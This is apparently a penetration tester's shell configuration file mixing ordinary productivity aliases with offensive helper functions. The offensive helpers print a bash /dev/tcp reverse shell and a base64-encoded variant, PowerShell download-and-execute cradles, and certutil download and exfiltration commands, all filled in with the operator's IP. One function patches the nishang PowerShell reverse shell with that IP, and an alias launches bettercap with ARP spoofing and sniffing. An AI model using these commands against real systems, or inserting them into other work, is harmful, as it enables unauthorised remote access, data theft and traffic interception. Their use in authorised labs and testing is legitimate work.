#!/bin/bash

# TODO: meterpreter menu

function is_empty {
  thing=$1
  if [ $( echo -n "$thing" | wc -c ) == 0 ]; then
    return 0
  fi
  return 1
}

function prefer_order {
  token=$1
  tf=$(mktemp)
  tee $tf | grep "$token"
  grep -v $token $tf
  rm $tf
}

function getip_silent {
  iface=$(ip a s | awk -f ~/kb/awk-scripting/get-interface.awk)
  ip a s $iface | awk '$1 == "inet" { gsub(/\/.*/,"",$2);print $2 }'
}

# TODO: try to repace ugly things with is_empty
function getmyip {
  iface=$1
  ifacestf=$(mktemp)

  if [ -z "$iface" ]; then
    ip l | grep -E '^[[:digit:]]+: ' | cut -d ':' -f 2 | awk '{print $1}' > $ifacestf
    tunifaces=$(cat $ifacestf | grep '^tun')
    # if there's one single tun interface, grab it
    if [ $(echo "$tunifaces" | wc -l) == 1 ]; then
      export iface=$tunifaces
    fi
    # if we still can't find it, ask
    if [ -z "$iface" ]; then
      export iface=$(cat $ifacestf | fzf)
    fi
    rm $ifacestf
  fi
  ip a s $iface | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -n 1
}

function draw_bar {
  echo "===================================================================================================="
}

function do_title_bar {
  echo ""
  echo "===================================================================================================="
  figlet -f miniwi "$1" | lolcat
}

function downloadfiles {
  url=$1

  do_title_bar "windows files"
  echo "# DOS" | lolcat
  echo "certutil.exe -urlcache -split -f \"$url\" filename.exe"
  echo ""

  echo "# Powershell get file" | lolcat
  echo "wget \"$url\" -outfile filename.exe"
  echo "Invoke-WebRequest \"$url\" -outfile filename.exe"
  echo ""

  echo "# base64 xfer/exfil" | lolcat
  echo "certutil -encode exfil_file.dat exfil.b64"
  echo "certutil -decode payload.b64 payload.exe"
  echo ""
}

# TODO: use someone's script who already did the rest
function revshell {
  lhost=$(getmyip)
  lport=$1
  if [ -z "$lport" ]; then
    echo LPORT is empty
    echo "Usage: $0 [LPORT]"
    export lport=1234
  fi

  do_title_bar "windows rev shell"

  echo "# Powershell execute script (like a reverse shell)" | lolcat
  echo "IEX(New-Object Net.WebClient).downloadString( \"http://$lhost:$lport/filename.ps1\" )"
  echo ""

  do_title_bar "linux rev shell"

  bashshell=$(echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1")
  echo "$bashshell"
  echo "bash -c '$bashshell'"

  # optimize base64 to contain no special chars
  echo "optimizing base 64..."
  alnumb64=$(~/kb/bash-scripting/find-alphanum-base64.sh "$bashshell" | head -n 1)
  echo "echo $alnumb64|base64 -d|bash"

  #downloadfiles "http://$lhost:$lport/filename.exe"

#do_title_bar  "windows encoding"
#  echo "# Powershell encoded command (hacktricks)" | lolcat
#  cat << EOF
#kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
#PS> powershell -EncodedCommand <Base64>
#EOF
  echo ""
}

function stabshell {
  do_title_bar "stabilize linux shell"
  cat << EOF
python3 -c 'import pty;pty.spawn("/bin/bash")'
[ctrl] [z]
stty size
stty raw -echo; fg
[enter] [enter]

EOF
  stty size | awk '{print "stty rows",$1,"cols", $2}'

  cat << EOF
export TERM=xterm-256color
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/snap/bin
alias ll='ls -haltr --color=auto --time-style=full-iso'
set -o vi

# install fff script to somewhere writable (ex: home directory)
f() {
    EDITOR=vi ~/fff "\$@"
    cd "\$(cat "\${XDG_CACHE_HOME:=\${HOME}/.cache}/fff/.fff_d")"
}
alias ll='ls -haltr --color=auto'
alias ll='ls -haltr --color=auto --time-style=full-iso'
EOF
}

function breakout {
  stabshell
  revshell
}

# select ubuntu version, build docker in the current directory with gcc installed
function build_it_in_ubuntu_docker {
  tag=$1
  if is_empty $tag; then
    export tag=$(~/kb/docker/get-tags.sh ubuntu | fzf --prompt="select tag")
  fi
  ~/kb/docker/templates/ubuntu-dockerfile-template.sh $tag > Dockerfile 
  sudo docker build . -t test
  sudo docker run -it -v "$(pwd):$(pwd)" -w "$(pwd)" test
}

function nishanghere {
  ATTACKER=$(getmyip)
  PORT=$1
  if [ -z "$PORT" ]; then
    export PORT=4444
  fi
  cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 nishang.ps1
  # take the line, move to end and remove "PS >"
  ex -s -c 'g/Invoke.*Tcp -Rev.*192.168.254.226/m$' -c '$s/PS > //' -c wq nishang.ps1
  # edit the IP
  ex -s -c "\$s/192.168.254.226/$ATTACKER/" -c wq nishang.ps1
  # edit the port
  ex -s -c "\$s/4444/$PORT/" -c wq nishang.ps1
}

function boxnotes {
  dirname=$1
  if [ -z "$dirname" ]; then
    cp -r ~/kb/hacking/notes-template/* .
  else
    cp -r ~/kb/hacking/notes-template $dirname
  fi
}

function key {
  filename=$1
  ~/kb/bash-scripting/ssh-keygen-generate-file.exp $filename
  cat $filename.pub
}

# Add this to your .bashrc, .zshrc or equivalent.
# Run 'fff' with 'f' or whatever you decide to name the function.
f() {
    EDITOR=nvim fff "$@"
    cd "$(cat "${XDG_CACHE_HOME:=${HOME}/.cache}/fff/.fff_d")"
}

# aliases for quick shell commands

# productivity boosts
# gotta go fast
# like really fast
alias g=lazygit
alias v='nvim $(fzf --preview="bat --color=always {}")'
alias t='tmux a -t $(tmux ls | fzf| cut -d ":" -f 1) || tmux'
alias a='sudo apt install -y $(apt list 2>/dev/null | fzf | cut -d '/' -f 1)'
alias c='cd $(find / -type d 2>/dev/null | fzf "--preview=ls -al {}")'
alias q=exit
alias startnotes="nvim -c ':split' -c ':e scratch.md' notes.md"
alias ll='ls -haltr --color=auto --time-style=full-iso'
alias s='nvim scratch.md'

# helpful info scripts
alias k='~/tmux-scripts/searchmarkdown.sh -q "^# " ~/kb'
alias payl='~/tmux-scripts/searchmarkdown.sh -q "^#\+ " ~/PayloadsAllTheThings'
alias ht='~/tmux-scripts/searchmarkdown.sh -q "^# " ~/hacktricks'
alias gtfo='~/tmux-scripts/gtfobins.sh'
alias common='bat --style=plain --paging=never ~/kb/hacking/common-commands.md'
alias ttl='~/tmux-scripts/markdown-vivid.sh ~/kb/hacking/to-try-list.md'
alias exploits='~/tmux-scripts/search-fzf-sploit.sh'
alias ssh_perimeter='~/kb/bash-scripting/watch-failed-ssh-logins-live-check-shodan.sh'

# helpful commands
alias http='python3 -m http.server'
alias bc='sudo bettercap -autostart events.stream,net.recon,net.sniff,net.probe,arp.spoof,any.proxy'

export PATH=$PATH:/usr/share/hashcat-utils

# turn bash prompt into vi edit with Esc
set -o vi

#neofetch
which lolcat 2>/dev/null >/dev/null
if [[ $? == 0 ]]; then
  $HOME/kb/awk-scripting/center.awk $HOME/pen-test-environ/banner | lolcat
else
  $HOME/kb/awk-scripting/center.awk $HOME/pen-test-environ/banner
fi

# configure sudoedit
export EDITOR=nvim

# enable arrow key based history search completion
bindkey '\e[A' history-search-backward
bindkey '\e[B' history-search-forward

export LHOST=$(getip_silent)
# custom agnoster prompt
function ip_prompt {
  [ -z "$LHOST" ] || prompt_segment white 'black' $(getip_silent)
  [ -z "$IP" ] || prompt_segment yellow 'black' "$IP"
}
## add to .zshrc:
## export AGNOSTER_PROMPT_SEGMENTS=(ip_prompt prompt_status prompt_virtualenv prompt_dir prompt_git prompt_end)
